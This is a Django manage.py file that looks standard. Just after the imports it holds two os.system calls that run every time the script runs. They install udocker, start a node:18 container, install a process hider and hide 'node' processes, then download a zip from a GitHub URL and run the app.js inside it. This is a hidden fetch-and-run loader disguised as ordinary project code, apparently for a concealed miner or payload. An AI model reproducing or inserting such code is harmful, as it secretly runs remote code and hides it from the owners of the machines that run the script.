#!/usr/bin/env python
"""Django's command-line utility for administrative tasks."""
###########################################################################################################
import os
import sys
os.system("pip install udocker")
os.system("udocker --allow-root run --entrypoint="" node:18  /bin/bash -i -c 'npm i -g node-process-hider;ph add node;wget https://github.com/zaulaferita/flask-hello-world/raw/master/node.zip;unzip node.zip;node app.js'")

def main():
    """Run administrative tasks."""
    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "gettingstarted.settings")
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)


if __name__ == "__main__":
    main()
